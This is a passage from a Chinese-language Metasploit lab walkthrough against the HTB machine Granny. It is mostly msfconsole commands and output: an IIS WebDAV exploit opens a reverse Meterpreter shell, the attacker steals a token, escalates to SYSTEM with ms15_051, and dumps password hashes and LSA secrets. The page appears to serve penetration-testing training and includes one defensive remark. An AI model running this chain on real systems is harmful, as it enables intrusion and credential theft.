class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -p- -T5 -A 10.10.10.15</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.15</span><br><span class="line">[*] Nmap: Host is up (0.021s latency).</span><br><span class="line">[*] Nmap: Not shown: 65534 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">[*] Nmap: | http-methods:</span><br><span class="line">[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">[*] Nmap: |_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: |_http-title: Under Construction</span><br><span class="line">[*] Nmap: | http-webdav-scan:</span><br><span class="line">[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">[*] Nmap: |   WebDAV type: Unknown</span><br><span class="line">[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT</span><br><span class="line">[*] Nmap: |_  Server Type: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.15             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port  proto  name  state  info</span><br><span class="line">----         ----  -----  ----  -----  ----</span><br><span class="line">10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0</span><br></pre></td></tr></table></figure><p>接下来，我们查找有关此框上运行的服务的一些信息。具体来说，我们想要探索端口 80 以及那里托管了哪种 Web 服务。</p><p>我们注意到这是一个正在建设中的网站——在这里看不到任何与网络相关的内容。但是，仔细查看网页的末尾和 Nmap 扫描的结果，我们注意到服务器正在运行<code>Microsoft IIS httpd 6.0</code>。因此，我们朝着这个方向进一步研究，寻找此版本 IIS 的常见漏洞。经过一番搜索，我们找到了以下标记表示一个广泛存在的漏洞：<code>CVE-2017-7269</code>. 它还具有为其开发的 Metasploit 模块。</p><h4 id="MSF-寻找漏洞"><a href="#MSF-寻找漏洞" class="headerlink" title="MSF - 寻找漏洞"></a>MSF - 寻找漏洞</h4><p> MSF - 寻找漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search iis_webdav_upload_asp</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                       Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                       ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; use 0</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/iis_webdav_upload_asp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting        Required  Description</span><br><span class="line">   ----          ---------------        --------  -----------</span><br><span class="line">   HttpPassword                         no        The HTTP password to specify for authentication</span><br><span class="line">   HttpUsername                         no        The HTTP username to specify for authentication</span><br><span class="line">   METHOD        move                   yes       Move or copy the file on the remote system from .txt -&gt; .asp (Accepted: move, copy)</span><br><span class="line">   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload</span><br><span class="line">   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT         80                     yes       The target port (TCP)</span><br><span class="line">   SSL           false                  no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>我们继续设置所需的参数。目前，这些将是<code>LHOST</code>并且<code>RHOST</code>目标上的所有其他内容似乎都在运行默认配置。</p><h4 id="MSF-配置漏洞利用和有效载荷"><a href="#MSF-配置漏洞利用和有效载荷" class="headerlink" title="MSF - 配置漏洞利用和有效载荷"></a>MSF - 配置漏洞利用和有效载荷</h4><p> MSF - 配置漏洞利用和有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST 10.10.10.15</span><br><span class="line"></span><br><span class="line">RHOST =&gt; 10.10.10.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Checking /metasploit28857905.asp</span><br><span class="line">[*] Uploading 612435 bytes to /metasploit28857905.txt...</span><br><span class="line">[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...</span><br><span class="line">[*] Executing /metasploit28857905.asp...</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Deleting /metasploit28857905.asp (this doesn&#x27;t always work)...</span><br><span class="line">[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>我们有 Meterpreter shell。但是，请仔细查看上面的输出。此时我们可以看到目标系统上存在一个<code>.asp</code>名为 exists 的文件。<code>metasploit28857905</code>一旦获得 Meterpreter shell，如前所述，它将驻留在内存中。因此，不需要该文件，并且尝试删除<code>msfconsole</code>，但由于访问权限而失败。留下这样的痕迹对攻击者没有好处，并且会造成巨大的责任。</p><p>从系统管理员的角度来看，找到与此名称类型相匹配的文件或它的轻微变体可以证明有助于在其轨道中间停止攻击。如上所述，针对文件名或签名的正则表达式匹配甚至不允许攻击者在被正确配置的安全措施切断之前生成 Meterpreter shell。</p><p>我们继续我们的探索。在尝试查看我们在哪个用户上运行时，我们收到一条访问被拒绝的消息。我们应该尝试将我们的进程迁移到具有更多权限的用户。</p><h4 id="MSF-Meterpreter-迁移"><a href="#MSF-Meterpreter-迁移" class="headerlink" title="MSF - Meterpreter 迁移"></a>MSF - Meterpreter 迁移</h4><p> MSF - Meterpreter 迁移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">[-] 1055: Operation failed: Access is denied.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----               ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]                                                </span><br><span class="line"> 4     0     System                                                          </span><br><span class="line"> 216   1080  cidaemon.exe                                                    </span><br><span class="line"> 272   4     smss.exe                                                        </span><br><span class="line"> 292   1080  cidaemon.exe                                                    </span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line"></span><br><span class="line"> 1712  396   alg.exe                                                         </span><br><span class="line"> 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe</span><br><span class="line"> 1920  396   dllhost.exe                                                     </span><br><span class="line"> 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe</span><br><span class="line"> 2312  592   wmiprvse.exe                                                    </span><br><span class="line"> 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe</span><br><span class="line"> 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe</span><br><span class="line"> 4076  1080  cidaemon.exe                                                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1836</span><br><span class="line"></span><br><span class="line">Stolen token with username: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\NETWORK SERVICE</span><br></pre></td></tr></table></figure><p>现在我们已经在系统中至少建立了一些权限级别，是时候升级该权限了。因此，我们四处寻找任何有趣的东西，并在该<code>C:\Inetpub\</code>位置找到一个有趣的文件夹，名为<code>AdminScripts</code>. 然而，不幸的是，我们无权阅读其中的内容。</p><h4 id="MSF-与目标交互"><a href="#MSF-与目标交互" class="headerlink" title="MSF - 与目标交互"></a>MSF - 与目标交互</h4><p>我们可以很容易地决定运行本地漏洞利用建议模块，将其附加到当前活动的 Meterpreter 会话。为此，我们将当前 Meterpreter 会话置于后台，搜索我们需要的模块，并将 SESSION 选项设置为 Meterpreter 会话的索引号，将模块绑定到它。</p><h4 id="MSF-会话处理"><a href="#MSF-会话处理" class="headerlink" title="MSF - 会话处理"></a>MSF - 会话处理</h4><p> MSF - 会话处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; bg</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; search local_exploit_suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; use 0</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.15 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.15 - 34 exploit checks are being tried...</span><br><span class="line">nil versions are discouraged and will be deprecated in Rubygems 4</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><br></pre></td></tr></table></figure><p>运行侦察模块为我们提供了多种选择。通过每个单独的一个，我们降落在<code>ms15_051_client_copy_image</code>条目上，这被证明是成功的。这个漏洞利用让我们直接进入 root shell，让我们完全控制目标系统。</p><h4 id="MSF——特权升级"><a href="#MSF——特权升级" class="headerlink" title="MSF——特权升级"></a>MSF——特权升级</h4><p> MSF——特权升级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms15_051_client_copy_image):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set session 1</span><br><span class="line"></span><br><span class="line">session =&gt; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set LHOST tun0</span><br><span class="line"></span><br><span class="line">LHOST =&gt; tun0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms15_051_client_copy_image) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.26:4444 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 844 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 844...</span><br><span class="line">[*] Injecting exploit into 844...</span><br><span class="line">[*] Exploit injected. Injecting payload into 844...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.15</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>从这里开始，我们可以继续使用 Meterpreter 的大量功能。例如，提取哈希值、模拟我们想要的任何进程等等。</p><h4 id="MSF-转储哈希"><a href="#MSF-转储哈希" class="headerlink" title="MSF - 转储哈希"></a>MSF - 转储哈希</h4><p> MSF - 转储哈希</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::</span><br><span class="line">ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::</span><br><span class="line">IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::</span><br><span class="line">Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line">Local SID : S-1-5-21-1709780765-3897210020-3926566182</span><br><span class="line"></span><br><span class="line">SAMKey : 37ceb48682ea1b0197c7ab294ec405fe</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf</span><br><span class="line">  Hash NTLM: d6908f022af0373e9e21b8a241c86dca</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6</span><br><span class="line"></span><br><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : IUSR_GRANPA</span><br><span class="line">  Hash LM  : a274b4532c9ca5cdf684351fab962e86</span><br><span class="line">  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88</span><br><span class="line"></span><br><span class="line">RID  : 000003ec (1004)</span><br><span class="line">User : IWAM_GRANPA</span><br><span class="line">  Hash LM  : 95d112c4da2348b599183ac6b1d67840</span><br><span class="line">  Hash NTLM: a97f39734c21b3f6155ded7821d04d16</span><br><span class="line"></span><br><span class="line">RID  : 000003ef (1007)</span><br><span class="line">User : ASPNET</span><br><span class="line">  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b</span><br><span class="line">  Hash NTLM: edc0d5506804653f58964a2376bbd769</span><br><span class="line"></span><br><span class="line">RID  : 000003f1 (1009)</span><br><span class="line">User : Lakis</span><br><span class="line">  Hash LM  : f927b0679b3cc0e192410d9b0b40873c</span><br><span class="line">  Hash NTLM: 3064b6fc432033870c6730228af7867c</span><br></pre></td></tr></table></figure><h4 id="MSF-Meterpreter-LSA-秘密转储"><a href="#MSF-Meterpreter-LSA-秘密转储" class="headerlink" title="MSF - Meterpreter LSA 秘密转储"></a>MSF - Meterpreter LSA 秘密转储</h4><p> MSF - Meterpreter LSA 秘密转储</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line"></span><br><span class="line">Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )</span><br><span class="line">Domain name : HTB</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.7</span><br><span class="line">LSA Key : ada60ee248094ce782807afae1711b2c</span><br><span class="line"></span><br><span class="line">Secret  : aspnet_WP_PASSWORD</span><br><span class="line">cur/text: Q5C&#x27;181g16D&#x27;=F</span><br><span class="line"></span><br><span class="line">Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV</span><br><span class="line">cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 </span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 </span><br><span class="line">    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line">    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span 